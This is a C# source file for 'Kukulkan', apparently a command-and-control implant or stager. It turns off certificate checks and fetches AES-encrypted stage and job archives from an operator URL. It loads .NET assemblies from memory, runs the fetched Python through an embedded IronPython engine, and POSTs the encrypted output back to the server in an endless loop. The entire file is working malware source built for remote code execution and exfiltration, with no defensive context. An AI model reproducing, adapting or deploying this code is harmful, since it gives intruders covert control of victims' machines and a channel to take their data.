using System;
using System.Threading;
using System.IO;
using System.IO.Compression;
using System.Reflection;
using System.Net;
using IronPython.Hosting;
using IronPython.Modules;
using Microsoft.Scripting.Hosting;
using Microsoft.Scripting.Utils;
using System.Security.Cryptography;
using System.Text;
using System.Linq;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace Kukulkan
{
    [ComVisible(true), ClassInterface(ClassInterfaceType.AutoDual)]
    public class KDll
    {
        static Uri URL = null;
        static byte[] AES_KEY = null;
        static byte[] AES_IV = null;
        static ZipArchive Stage = null;

        static KDll()
        {
            ServicePointManager.ServerCertificateValidationCallback += (sender, cert, chain, sslPolicyErrors) => true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12;
        }
        // https://mail.python.org/pipermail/ironpython-users/2012-December/016366.html
        // http://ironpython.net/blog/2012/07/07/whats-new-in-ironpython-273.html
        // https://blog.adamfurmanek.pl/2017/10/14/sqlxd-part-22/
        public static dynamic CreateEngine()
        {
            ScriptRuntimeSetup setup = Python.CreateRuntimeSetup(GetRuntimeOptions());
            var pyRuntime = new ScriptRuntime(setup);
            ScriptEngine engineInstance = Python.GetEngine(pyRuntime);

            AddPythonLibrariesToSysMetaPath(engineInstance);

            return engineInstance;
        }
        private static IDictionary<string, object> GetRuntimeOptions()
        {
            var options = new Dictionary<string, object>();
            options["Debug"] = false;
            return options;
        }
        public static void AddPythonLibrariesToSysMetaPath(ScriptEngine engineInstance)
        {
            Assembly asm = Assembly.GetExecutingAssembly().GetType().Assembly;
            try
            {
                var resQuery =
                    from name in asm.GetManifestResourceNames()
                    where name.ToLowerInvariant().EndsWith(".zip")
                    select name;
                string resName = resQuery.Single();
#if DEBUG
                Console.WriteLine("Found embedded IPY stdlib : {0}", resName);
#endif
                var importer = new ResourceMetaPathImporter(asm, resName);
                dynamic sys = engineInstance.GetSysModule();
                sys.meta_path.append(importer);
                sys.path.append(importer);
                //List metaPath = sys.GetVariable("meta_path");
                //metaPath.Add(importer);
                //sys.SetVariable("meta_path", metaPath);
            }
            catch (Exception e)
            {
#if DEBUG
                Console.WriteLine("Did not find IPY stdlib in embedded resources: {0}", e.Message);
#endif
                return;
            }
        }

        public static Byte[] GetResourceInZip(ZipArchive zip, string resourceName)
        {
            foreach (var entry in zip.Entries)
            {
                if (entry.Name == resourceName)
                {
#if DEBUG
                    Console.WriteLine("Found {0} in zip", resourceName);
#endif
                    using (var resource = entry.Open())
                    {
                        var resdata = new Byte[entry.Length];
                        resource.Read(resdata, 0, resdata.Length);
                        return resdata;
                    }
                }
            }
            return new Byte[0];
        }
        public static byte[] DecryptData(byte[] encryptedData)
        {
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.Key = AES_KEY;
                aesAlg.IV = AES_IV;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream decryptedData = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(decryptedData, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(encryptedData, 0, encryptedData.Length);
                        cryptoStream.FlushFinalBlock();
                        return decryptedData.ToArray();
                    }
                }
            }
        }
        public static byte[] EncryptData(byte[] output)
        {
            //byte[] unicodeBytes = Encoding.UTF8.GetBytes(plaintext);
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Padding = PaddingMode.PKCS7;
                aesAlg.KeySize = 256;
                aesAlg.Key = AES_KEY;
                aesAlg.IV = AES_IV;

                ICryptoTransform decryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV);

                using (MemoryStream encryptedData = new MemoryStream())
                {
                    using (CryptoStream cryptoStream = new CryptoStream(encryptedData, decryptor, CryptoStreamMode.Write))
                    {
                        cryptoStream.Write(output, 0, output.Length);
                        cryptoStream.FlushFinalBlock();
                        return encryptedData.ToArray();
                    }
                }
            }
        }
        public static ZipArchive StageZipFile(Uri URL, String zipname)
        {
            var StageURL = new Uri(URL, zipname);
#if DEBUG
            Console.WriteLine("Attempting ZIP staging from {0}", StageURL);
#endif
            while (true)
            {
                try
                {
                    using (var wc = new WebClient())
                    {
                        var data = wc.DownloadData(StageURL);
#if DEBUG
                        Console.WriteLine("Downloaded {0} bytes", data.Length);
#endif
                        byte[] zip = DecryptData(data);
                        return new ZipArchive(new MemoryStream(zip));
                    }
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Error downloading {0}: {1}", URL, e.Message);
#endif
                    Thread.Sleep(5000);
                }
            }
        }
        public static void SendResults(Uri URL, byte[] data)
        {
            var jobEndpoint = new Uri(URL, "job");
#if DEBUG
            Console.WriteLine("Attempting to send job results to {0}", jobEndpoint);
#endif
            while (true)
            {
                try
                {
                    var wr = WebRequest.Create(jobEndpoint);
                    wr.Method = "POST";
                    wr.ContentType = "application/octet-stream";
                    wr.ContentLength = data.Length;
                    var requestStream = wr.GetRequestStream();
                    requestStream.Write(data, 0, data.Length);
                    requestStream.Close();
                    wr.GetResponse();
                    break;
                }
                catch (Exception e)
                {
#if DEBUG
                    Console.WriteLine("Error sending job results to {0}: {1}", URL, e.Message);
#endif
                    Thread.Sleep(5000);
                }
            }
        }
        private static Assembly MyResolveEventHandler(object sender, ResolveEventArgs args)
        {
            string DllName = args.Name.Substring(0, args.Name.IndexOf(',')) + ".dll";
            var bytes = default(byte[]);
#if DEBUG
            Console.WriteLine("Trying to resolve {0} using staged zip", DllName);
#endif
            if (Stage == null)
            {
                Stage = StageZipFile(URL, "stage.zip");
            }
            bytes = GetResourceInZip(Stage, DllName);

            Assembly asm = Assembly.Load(bytes);
#if DEBUG
            Console.WriteLine("'{0}' loaded", asm.FullName);
#endif
            return asm;
        }
        public static byte[] sha256(string randomString)
        {
            var crypt = new SHA256Managed();
            return crypt.ComputeHash(Encoding.UTF8.GetBytes(randomString));
        }
        public static byte[] StringToByteArray(string hex)
        {
            int NumberChars = hex.Length;
            byte[] bytes = new byte[NumberChars / 2];
            for (int i = 0; i < NumberChars; i += 2)
                bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
            return bytes;
        }

        [DllExport("Main", CallingConvention = CallingConvention.StdCall)]
        public static void Main(string[] args)
        {
            string aesKey = null;
            string aesIV = null;

            if (args.Length != 3)
            {
                Console.WriteLine("Usage: Kukulkan.exe <key> <IV> <URL>");
                Environment.Exit(1);
            }

            try
            {
                aesKey = args[0];
            }
            catch { }

            try
            {
                aesIV = args[1];
            }
            catch { }

            try
            {
                URL = new Uri(args[2]);
            }
            catch { }

            AES_KEY = sha256(aesKey);
            AES_IV = StringToByteArray(aesIV);

            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(MyResolveEventHandler);

            var hash = new StringBuilder();
            foreach (byte theByte in AES_KEY)
            {
                hash.Append(theByte.ToString("x2"));
            }

            Console.WriteLine("URL: {0}", URL);
            Console.WriteLine("AES_KEY: {0} (SHA256: {1})", aesKey, hash);
            Console.WriteLine("AES_IV: {0}", aesIV);
            Console.WriteLine();

            StartEngine();
        }
        public static void StartEngine()
        {
            while (true)
            {
                using (var engineStream = new MemoryStream())
                {
                    var engine = CreateEngine();
                    engine.Runtime.IO.SetOutput(engineStream, Encoding.UTF8);
                    engine.Runtime.IO.SetErrorOutput(engineStream, Encoding.UTF8);

                    var scope = engine.CreateScope();
                    scope.SetVariable("URL", URL.ToString());
                    //scope.SetVariable("CHANNEL", "http");
                    //scope.SetVariable("IronPythonDLL", Assembly.Load(GetResourceInZip(stage, "IronPython.dll")));
#if DEBUG
                    scope.SetVariable("DEBUG", true);
#elif RELEASE
        scope.SetVariable("DEBUG", false);
#endif
                    var jobZip = StageZipFile(URL, "job.zip");

                    var job = GetResourceInZip(jobZip, "main.py");
                    //result = PythonOps.InitializeModuleEx(Assembly.Load(GetResourceInZip(stage, "Main.dll")), "__main__", null, false, null);

                    engine.Execute(Encoding.UTF8.GetString(job, 0, job.Length), scope);

                    if (engineStream.Length > 0)
                    {
                        byte[] encryptedResults = EncryptData(engineStream.ToArray());
                        SendResults(URL, encryptedResults);
                    }
                }
                Thread.Sleep(10000);
            }
        }
    }
}